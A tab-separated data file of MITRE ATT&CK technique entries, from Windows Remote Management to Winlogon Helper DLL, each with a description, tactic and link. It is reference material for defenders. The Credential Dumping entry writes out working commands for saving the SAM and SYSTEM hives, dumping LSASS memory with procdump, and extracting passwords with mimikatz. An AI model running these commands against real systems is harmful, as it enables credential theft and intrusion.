ID	Name	Description	Tactics	Mitigation	Examples	URL
T1028	Windows Remote Management	Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell.	Execution, Lateral Movement	[]	''	https://attack.mitre.org/wiki/Technique/T1028
T1009	Binary Padding	Some security tools inspect files with static signatures to determine if they are known malicious. Adversaries may add data to files to increase the size beyond what security tools are capable of handling or to change the file hash to avoid hash-based blacklists.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1009
T1008	Fallback Channels	Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1008
T1003	Credential Dumping	Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform\xa0Lateral Movement\xa0and access restricted information.\n\nSeveral of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\nSAM (Security Accounts Manager)\n\nThe SAM is a database file that contains local accounts for the host, typically those found with the \u2018net user\u2019 command.  To enumerate the SAM database, system level access is required.\n\xa0\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n* pwdumpx.exe \n* [[Software/S0008|gsecdump]]\n* [[Software/S0002|Mimikatz]]\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with [[Software/S0075|Reg]]:\n* reg save HKLM\sam sam\n* reg save HKLM\system system\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid 501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\nCached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable.  The number of default cached credentials varies, and this number can be altered per system.  This hash does not allow pass-the-hash style attacks.\n\xa0\nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n* pwdumpx.exe \n* [[Software/S0008|gsecdump]]\n* [[Software/S0002|Mimikatz]]\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using PBKDF2.\n\nLocal Security Authority (LSA) Secrets\n\nWith SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.\n\xa0\nWhen services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.\n\xa0\nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n* pwdumpx.exe \n* [[Software/S0008|gsecdump]]\n* [[Software/S0002|Mimikatz]]\n* secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted by his mechanism are\xa0UTF-16\xa0encoded, which means that they are returned in\xa0plaintext.\nWindows 10 adds protections for LSA Secrets described in Mitigation.\n\nNTDS from Domain Controller\n\nActive Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\NTDS\Ntds.dit of a domain controller.\n \nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\xa0\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\nGroup Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.\n\xa0\nThese group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line.\n\xa0\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\xa0\n* Metasploit\u2019s post exploitation module: "post/windows/gather/credentials/gpp"\n* Get-GPPPassword\n* gpprefdecrypt.py\n\xa0\nNotes:\nOn the SYSVOL share, the following can be used to enumerate potential XML files.\ndir /s *.xml\n\nService Principal Names (SPNs)\n\nSee [[Technique/T1208|Kerberoasting]].\n\nPlaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials are generated and stored in the\xa0Local Security Authority Subsystem Service\xa0(LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.\n\xa0\nSSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs):\xa0A Security Support Provider is a\xa0dynamic-link library\xa0(DLL) that makes one or more security packages available to applications.\n\nThe following SSPs can be used to access credentials:\n\xa0\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\nCredSSP: \xa0Provides SSO and\xa0Network Level Authentication\xa0for\xa0Remote Desktop Services.\n\xa0\nThe following tools can be used to enumerate credentials:\n\xa0\n* [[Software/S0005|Windows Credential Editor]]\n* [[Software/S0002|Mimikatz]]\n\xa0\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\xa0\nFor example, on the target host use procdump:\n* procdump -ma lsass.exe lsass_dump\n\xa0\nLocally, mimikatz can be run:\n* sekurlsa::Minidump\xa0lsassdump.dmp\n* sekurlsa::logonPasswords\n\nDCSync \n\nDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller\'s  application programming interface (API) to simulate the replication process from a remote domain controller.  Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data  from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [[Technique/T1097|Pass the Ticket]] or change an account\'s password as noted in [[Technique/T1098|Account Manipulation]]. DCSync functionality has been included in the "lsadump" module in Mimikatz. Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1003
T1002	Data Compressed	An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.	Exfiltration	[]	''	https://attack.mitre.org/wiki/Technique/T1002
T1001	Data Obfuscation	Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, commingling legitimate traffic with C2 communications traffic, or using a non-standard data encoding system, such as a modified Base64 encoding for the message body of an HTTP request.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1001
T1007	System Service Discovery	Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are "sc," "tasklist /svc" using [[Software/S0057|Tasklist]], and "net start" using [[Software/S0039|Net]], but adversaries may also use other tools as well.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1007
T1006	File System Logical Offsets	Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools.\n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1006
T1005	Data from Local System	Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to [[Exfiltration]].\n\nAdversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a [[Technique/T1059|Command-Line Interface]], such as [[Software/S0106|cmd]], which has functionality to interact with the file system to gather information. Some adversaries may also use [[Technique/T1119|Automated Collection]] on the local system.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1005
T1004	Winlogon Helper DLL	Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\Software\[Wow6432Node\]Microsoft\Windows NT\CurrentVersion\Winlogon\ and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are used to manage additional helper programs and functionalities that support Winlogon. \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:\n* Winlogon\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish [[Persistence]].	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1004
